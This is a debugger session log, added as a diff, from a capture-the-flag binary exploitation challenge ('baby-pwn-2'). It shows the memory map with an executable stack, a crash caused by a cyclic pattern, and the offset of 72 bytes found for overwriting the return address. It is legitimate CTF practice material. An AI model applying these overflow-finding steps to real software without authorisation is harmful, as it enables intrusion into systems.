@@ -1,0 +1,81 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2
+0x00401000         0x00402000         r-xp	/home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2
+0x00402000         0x00403000         r--p	/home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2
+0x00403000         0x00404000         r--p	/home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2
+0x00404000         0x00405000         rw-p	/home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2
+0x00405000         0x00426000         rw-p	[heap]
+0x00007ffff7d79000 0x00007ffff7d7c000 rw-p	mapped
+0x00007ffff7d7c000 0x00007ffff7da4000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7da4000 0x00007ffff7f39000 r-xp	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f39000 0x00007ffff7f91000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f91000 0x00007ffff7f92000 ---p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f92000 0x00007ffff7f96000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f96000 0x00007ffff7f98000 rw-p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f98000 0x00007ffff7fa5000 rw-p	mapped
+0x00007ffff7fbb000 0x00007ffff7fbd000 rw-p	mapped
+0x00007ffff7fbd000 0x00007ffff7fc1000 r--p	[vvar]
+0x00007ffff7fc1000 0x00007ffff7fc3000 r-xp	[vdso]
+0x00007ffff7fc3000 0x00007ffff7fc5000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7fc5000 0x00007ffff7fef000 r-xp	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7fef000 0x00007ffff7ffa000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ffb000 0x00007ffff7ffd000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ffd000 0x00007ffff7fff000 rw-p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+gdb-peda$ pattc 128
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'
+gdb-peda$ run
+Starting program: /home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to the baby pwn 2 challenge!
+Stack address leak: 0x7fffffffdda0
+Enter some text: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffdda0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANA)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0xfbad2288 
+RSI: 0x4052a1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AA)
+RDI: 0x7ffff7f98a80 --> 0x0 
+RBP: 0x4141334141644141 ('AAdAA3AA')
+RSP: 0x7fffffffdde8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
+RIP: 0x4011a7 (<vulnerable_function+81>:	ret)
+R8 : 0x0 
+R9 : 0x4052a0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A)
+R10: 0x77 ('w')
+R11: 0x246 
+R12: 0x7fffffffdf08 --> 0x7fffffffe276 ("/home/mito/CTF/UofTCTF_2025/Pwn_Baby_Pwn_2/baby-pwn-2")
+R13: 0x4011a8 (<main>:	push   rbp)
+R14: 0x403df0 --> 0x401120 (endbr64)
+R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4011a0 <vulnerable_function+74>:	call   0x401050 <fgets@plt>
+   0x4011a5 <vulnerable_function+79>:	nop
+   0x4011a6 <vulnerable_function+80>:	leave  
+=> 0x4011a7 <vulnerable_function+81>:	ret    
+   0x4011a8 <main>:	push   rbp
+   0x4011a9 <main+1>:	mov    rbp,rsp
+   0x4011ac <main+4>:	mov    rax,QWORD PTR [rip+0x2e7d]        # 0x404030 <stdout@GLIBC_2.2.5>
+   0x4011b3 <main+11>:	mov    ecx,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdde8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
+0008| 0x7fffffffddf0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
+0016| 0x7fffffffddf8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
+0024| 0x7fffffffde00 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
+0032| 0x7fffffffde08 ("A7AAMAAiAA8AANAAjAA9AAO")
+0040| 0x7fffffffde10 ("AA8AANAAjAA9AAO")
+0048| 0x7fffffffde18 --> 0x4f41413941416a ('jAA9AAO')
+0056| 0x7fffffffde20 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004011a7 in vulnerable_function ()
+gdb-peda$ patto IAAe
+IAAe found at offset: 72
